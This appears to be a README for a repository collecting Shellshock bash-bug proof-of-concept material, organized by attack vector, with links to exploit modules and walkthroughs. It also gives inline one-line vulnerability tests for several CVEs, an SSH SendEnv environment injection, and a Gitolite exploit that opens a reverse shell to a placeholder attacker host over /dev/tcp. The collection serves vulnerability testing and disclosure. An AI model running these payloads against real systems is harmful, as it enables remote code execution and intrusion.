Shellshocker - Repository of "Shellshock" Proof of Concept Code
=================

Collection of Proof of Concepts and Potential Targets for #ShellShocker

Wikipedia Link: https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29#CVE-2014-7186_and_CVE-2014-7187_Details

Please submit a pull request if you have more links or other resources

**Speculation:(Non-confirmed possibly vulnerable)** 

+ XMPP(ejabberd)
+ ~~Mailman~~ - [confirmed not vulnerable](http://www.mail-archive.com/mailman-users%40python.org/msg65380.html)
+ MySQL
+ NFS
+ Bind9
+ Procmail [see](https://www.dfranke.us/posts/2014-09-27-shell-shock-exploitation-vectors.html)
+ Exim [see](https://www.dfranke.us/posts/2014-09-27-shell-shock-exploitation-vectors.html)
+ Juniper Google Search`inurl:inurl:/dana-na/auth/url_default/welcome.cgi`
  + via: https://twitter.com/notsosecure/status/516132301025984512
  + via: http://kb.juniper.net/InfoCenter/index?page=content&id=JSA10648&actp=RSS
+ Cisco Gear
  + via: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140926-bash
+ FreePB / Asterix [patched here](http://community.freepbx.org/t/cve-2014-6271-shellshock-bash-exploit/24431)

**If you know of PoCs for any of these, please submit an issue or pull request with a link.**

## Command Line (Linux, OSX, and Windows via Cygwin)

+ [bashcheck](https://github.com/hannob/bashcheck) - script to test for the latest vulns

### CVE-2014-6271
+ `env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id`

### CVE-2014-7169
_will create a file named echo in cwd with date in it, if vulnerable_
+ `env X='() { (a)=>\' bash -c "echo date"; cat echo`

### CVE-2014-7186
+ `bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"`

### CVE-2014-7187
+ `(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"`

### CVE-2014-6278
+ `env X='() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }' bash -c :`
+ Additional information: http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html

### CVE-2014-6277
_will segfault if vulnerable_
+ `env X='() { x() { _; }; x() { _; } <<a; }' bash -c :`
+ Additional discussion on fulldisclosure: http://seclists.org/fulldisclosure/2014/Oct/9
+ Additional information: http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html



## IBM z/OS - 
+ http://mainframed767.tumblr.com/post/98446455927/bad-news-is-it-totally-works-in-bash-on-z-os-and

## HTTP
+ Metasploit Exploit Module Apache MOD_CGI - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/apache_mod_cgi_bash_env_exec.rb
+ HTTP Header Polution by @irsdl - http://pastebin.com/QNkf7dYS
+ HTTP CGI-BIN - http://pastebin.com/166f8Rjx
+ cPanel - http://blog.sucuri.net/2014/09/bash-vulnerability-shell-shock-thousands-of-cpanel-sites-are-high-risk.html
+ Digital Alert Systems DASDEC - http://seclists.org/fulldisclosure/2014/Sep/107
+ F5 - https://twitter.com/securifybv/status/515035044294172673
  + https://twitter.com/securifybv/status/515035044294172673/photo/1
  + https://twitter.com/avalidnerd/status/515056463589675008
    + https://twitter.com/avalidnerd/status/515056463589675008/photo/1
+ Invisiblethreat.ca - https://www.invisiblethreat.ca/2014/09/cve-2014-6271/
+ Commandline version - https://gist.github.com/mfadzilr/70892f43597e7863a8dc
+ User-Agent based walkthrough with LiveHTTPHeaders - http://www.lykostech.net/lab-time-exploiting-shellshock-bash-bug-virtual-server/
+ User-Agent based walkthrough with Burp - http://oleaass.com/shellshock-proof-of-concept-reverse-shell/
+ User-Agent via Curl with test server - http://shellshock.notsosecure.com/
+ User-Agent based but supports Tor and Socks5 (Python) - https://github.com/lnxg33k/misc/blob/master/shellshock.py
+ User-Agent based in Ruby - https://github.com/securusglobal/BadBash
+ Header based simple scanner using sleep with multithread support - https://github.com/gry/shellshock-scanner

## Phusion Passenger
+ https://news.ycombinator.com/item?id=8369776 

## DHCP
+ Trusted sec exploitation via Tftpd32 - https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/
+ Metasploit Exploit Module - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/dhcp/bash_environment.rb
+ Metasploit Auxiliary Module - https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/dhclient_bash_env.rb
+ Perl Script - http://pastebin.com/S1WVzTv9
+ using a Wi-Fi pineapple to force people to join the network - http://d.uijn.nl/?p=32

## SSH
+ Stack Overflow - http://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh
+ SSH ForcedCommand - https://twitter.com/JZdziarski/status/515205581226123264
  + https://twitter.com/JZdziarski/status/515205581226123264/photo/1
+ SendEnv: `LC_X='() { :; }; echo vulnerable' ssh foo@bar.org -o SendEnv=LC_X`
+ Gitolite - https://twitter.com/Grifo/status/515089986161766400
  + $ `ssh GITOLITEUSER@VULNERABLEIP '() { ignore;}; /bin/bash -i >& /dev/tcp/REVERSESHELLIP/PORT 0>&1'`
  + (necessary to have a git account on the server)

## OSX 
+ Priv Escalation via VMware Fusion - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/osx/local/vmware_bash_function_root.rb
+ Fix: http://support.apple.com/kb/DL1769

## OSX - with reverse DNS (CVE-2014-3671.txt)
+ Example zone file: [in-addr.arpa](osx-rev-ptr/in-addr.arpa.zone) that contains a CVE-2014-6271 example.
+ Example file with a getnameinfo() that passes on to setenv(): [osx-rev-ptr.c](osx-rev-ptr/osx-rev-ptr.c)
 + Advisory with description of above [CVE-2014-3671.txt ](osx-rev-ptr/CVE-2014-3671.txt)

## SIP
+ SIP Proxies: https://github.com/zaf/sipshock


## Qmail
+ Detailed walkthrough - http://marc.info/?l=qmail&m=141183309314366&w=2
+ Tweet from @ymzkei5 - http://twitter.com/ymzkei5/status/515328039765307392
  + http://twitpic.com/ec3615
  + http://twitpic.com/ec361o

## Postfix
+ http://packetstormsecurity.com/files/128572/postfixsmtp-shellshock.txt

## FTP
+ Pure-FTPd: https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc

## OpenVPN
+ OpenVPN - https://news.ycombinator.com/item?id=8385332
+ PoC Walkthrough by @fj33r - http://sprunge.us/BGjP

## Oracle
+ [Alert and list of affected Products](http://www.oracle.com/technetwork/topics/security/alert-cve-2014-7169-2303276.html)

## TMNT
+ https://twitter.com/SynAckPwn/status/514961810320293888/photo/1

## Hand
+ Via @DJManilaIce - http://pastie.org/9601055
```
user@localhost:~$ env X='() { (a)=>\' /bin/bash -c "shellshocker echo -e \"           __ __\n          /  V  \ \n     _    |  |   |\n    / \   |  |   |\n    |  |  |  |   |\n    |  |  |  |   |\n    |  |__|  |   |\n    |  |  \  |___|___\n    |  \   |/        \ \n    |   |  |______    |\n    |   |  |          |\n    |   \__'   /     |\n    \        \(     /\n     \             /\n      \|            |\n\""; cat shellshocker
/bin/bash: X: line 1: syntax error near unexpected token `='
/bin/bash: X: line 1: `'
/bin/bash: error importing function definition for `X'
           __ __
          /  V  \ 
     _    |  |   |
    / \   |  |   |
    |  |  |  |   |
    |  |  |  |   |
    |  |__|  |   |
    |  |  \  |___|___
    |  \   |/        \ 
    |   |  |______    |
    |   |  |          |
    |   \__'   /     |
    \        \(     /
     \             /
      \|            |

```

## CUPS
+ Metasploit Exploit Module - [CUPS Filter Bash Environment Variable Code Injection](https://github.com/rapid7/metasploit-framework/pull/4050)

## Scripts from @primalsec
+ `shell_shocker.py` - Good for interacting with a known vulnerable URL to pass commands (User-Agent Method)
+ `w3af_shocker.py` - Automates the process of running a w3af spider/shell\_shock scan (User-Agent Method)
+ `shell_sprayer.py` - Checks across a list of URLs in a file, or a single URL against a known list of cgi-bin resources (User-Agent Method)
